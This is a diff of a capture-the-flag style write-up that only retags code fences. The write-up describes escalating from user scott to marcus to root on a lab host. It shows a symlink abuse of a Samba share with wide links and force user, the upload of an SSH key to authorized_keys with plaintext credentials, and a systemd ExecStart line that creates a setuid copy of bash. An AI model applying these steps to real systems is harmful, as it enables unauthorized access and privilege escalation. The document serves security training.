@@ -236,14 +236,14 @@ As a result, any files accessed through such symbolic links would be handled usi
 This configuration can be leveraged by creating a symbolic link within the `transfer` share that points to files in `marcus`'s home directory. Because `wide links` is enabled, Samba will follow the symlink outside of the shared directory, and due to `force user = marcus`, all file operations performed through the share will be executed with the privileges of the `marcus` account. As a result, it becomes possible to write an SSH public key to `~marcus/.ssh/authorized_keys`, ultimately allowing authentication as `marcus` via SSH.
 
 An SSH key pair was then generated for authentication:
-```
+```bash
 scott@abducted:~$ ln -s /home/marcus/ /srv/transfer/marcus_home
 
 $ ssh-keygen -t ed25519 -f key
 ```
 
 Next, the transfer share was accessed over SMB using Scott's credentials. The symbolic link exposed Marcus's home directory through the share, allowing navigation to the target location. A .ssh directory was created, and the attacker's public key was uploaded as authorized_keys:
-```
+```bash
 $ smbclient //10.129.102.73/transfer -U scott%iXzvcib3SrpZ
 
 $ cd marcus_home
@@ -261,7 +261,7 @@ $ exit
 Because the share was configured with `force user = marcus`, all file operations were performed with Marcus's privileges. As a result, the uploaded public key was written as Marcus, enabling SSH key-based authentication to his account.
 
 A new SSH session was then established using the generated private key:
-```
+```bash
 $ ssh -i key marcus@10.129.102.73
 
 marcus@abducted:~$ id
@@ -290,7 +290,7 @@ ExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash"
 ```
 
 The modified service configuration was then loaded and the Samba service restarted:
-```bash id="uklj3q"
+```bash 
 marcus@abducted:~$ systemctl daemon-reload
 marcus@abducted:~$ systemctl restart smbd
 ```
